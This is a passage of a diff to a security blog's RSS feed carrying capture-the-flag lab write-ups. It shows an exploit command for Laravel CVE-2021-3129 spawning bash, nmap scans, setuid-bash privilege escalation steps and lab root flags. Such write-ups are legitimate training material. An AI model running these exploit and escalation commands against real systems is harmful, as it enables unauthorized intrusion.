 There is a PHAR deserialization CVE that allows RCE: CVE-2021-3129. &lt;a href=&#34;https://github.com/zhzyker/CVE-2021-3129&#34;&gt;https://github.com/zhzyker/CVE-2021-3129&lt;/a&gt;.&lt;/p&gt;
 &lt;p&gt;9- &lt;code&gt;python3 exp.py http://localhost:8000/ &amp;quot;system(&#39;/bin/bash&#39;);&amp;quot;&lt;/code&gt; but change exp.py with &lt;a href=&#34;https://github.com/crisprss/Laravel_CVE-2021-3129_EXP&#34;&gt;https://github.com/crisprss/Laravel_CVE-2021-3129_EXP&lt;/a&gt;.&lt;/p&gt;
 &lt;p&gt;root.txt: 095ff8dc5f20b8e1aef209106c989d0c&lt;/p&gt;
-
-  &lt;/div&gt;
-&lt;/div&gt;</content>
+</content>
     </item>
     
     <item>
@@ -1548,15 +1359,9 @@ There is a PHAR deserialization CVE that allows RCE: CVE-2021-3129. &lt;a href=&
       <pubDate>Tue, 07 Sep 2021 12:36:57 +0200</pubDate>
       
       <guid>/labs/bounty_hunter/</guid>
-      <description>&lt;ul&gt;
-&lt;li&gt;Rank: easy&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;These are the notes I took while attacking the machine. Note that it contains failed attempts that lead to dead ends but I edited them a bit to make the steps easier to follow.&lt;/p&gt;</description>
-      <content>&lt;ul&gt;
-&lt;li&gt;Rank: easy&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;These are the notes I took while attacking the machine. Note that it contains failed attempts that lead to dead ends but I edited them a bit to make the steps easier to follow.&lt;/p&gt;
-&lt;h2 id=&#34;foothold&#34;&gt;Foothold&lt;/h2&gt;
+      <description>Foothold 1- Nmap discovers ports 22 and 80.
+# Nmap 7.91 scan initiated Mon Aug 2 03:22:27 2021 as: nmap -sC -sV -v -p- -oA nmap bountyhunter.htb Nmap scan report for bountyhunter.htb (10.10.11.100) Host is up (0.068s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA) | 256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA) |_ 256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519) 80/tcp open http Apache httpd 2.</description>
+      <content>&lt;h2 id=&#34;foothold&#34;&gt;Foothold&lt;/h2&gt;
 &lt;p&gt;1- Nmap discovers ports 22 and 80.&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# Nmap 7.91 scan initiated Mon Aug  2 03:22:27 2021 as: nmap -sC -sV -v -p- -oA nmap bountyhunter.htb
 Nmap scan report for bountyhunter.htb (10.10.11.100)
@@ -1736,39 +1541,9 @@ main()
       <pubDate>Sun, 05 Sep 2021 13:56:52 +0200</pubDate>
       
       <guid>/labs/previse/</guid>
-      <description>&lt;ul&gt;
-&lt;li&gt;Rank: easy&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;These are the notes I took while attacking the machine. Note that it contains failed attempts that lead to dead ends but I edited them a bit to make the steps easier to follow.&lt;/p&gt;</description>
-      <content>&lt;ul&gt;
-&lt;li&gt;Rank: easy&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;These are the notes I took while attacking the machine. Note that it contains failed attempts that lead to dead ends but I edited them a bit to make the steps easier to follow.&lt;/p&gt;
-&lt;div class=&#34;hugo-encryptor-container&#34;&gt;
-  &lt;div class=&#34;hugo-encryptor-prompt&#34;&gt;
-    
-      &lt;p&gt;Part of this article is encrypted with password:&lt;/p&gt;
-    
-  &lt;/div&gt;
-  &lt;div class=&#34;hugo-encryptor-form&#34;&gt;
-    &lt;input
-      class=&#34;hugo-encryptor-input&#34;
-      placeholder=&#39;Please input the password&#39;
-    /&gt;
-    &lt;input
-      class=&#34;hugo-encryptor-button&#34;
-      type=&#34;button&#34;
-      value=&#39;Click to verify&#39;
-      onclick=&#34;_click_handler(this)&#34;
-    /&gt;
-  &lt;/div&gt;
-  &lt;div
-    class=&#34;hugo-encryptor-cipher-text&#34;
-    data-password=&#34;23c44ab8465e7ff51a5fab75847e088b&#34;
-    style=&#34;display: none;&#34;
-  &gt;
-    &lt;span style=&#34;display: none;&#34;&gt;--- DON&#39;T MODIFY THIS LINE ---&lt;/span&gt;
-    &lt;h2 id=&#34;foothold&#34;&gt;Foothold&lt;/h2&gt;
+      <description>Foothold 1- Nmap discovers tcp 22 and 80 ports.
+# Nmap 7.91 scan initiated Thu Aug 12 05:08:52 2021 as: nmap -sV -sC -oA nmap -p- -v previse.htb Nmap scan report for previse.htb (10.10.11.104) Host is up (0.068s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA) | 256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA) |_ 256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519) 80/tcp open http Apache httpd 2.</description>
+      <content>&lt;h2 id=&#34;foothold&#34;&gt;Foothold&lt;/h2&gt;
 &lt;p&gt;1- Nmap discovers tcp 22 and 80 ports.&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# Nmap 7.91 scan initiated Thu Aug 12 05:08:52 2021 as: nmap -sV -sC -oA nmap -p- -v previse.htb
 Nmap scan report for previse.htb (10.10.11.104)
@@ -1933,9 +1708,7 @@ cat &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;lt;&amp;lt; EOF &amp;gt; gzip
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;12- Now &lt;code&gt;/tmp/c&lt;/code&gt; is a setuid bash.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;/tmp/c -p &lt;span style=&#34;color:#75715e&#34;&gt;# this flag sets the real userid as the effective userid&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;root.txt: 23c44ab8465e7ff51a5fab75847e088b&lt;/p&gt;
-
-  &lt;/div&gt;
-&lt;/div&gt;</content>
+</content>
     </item>
     
   </channel>
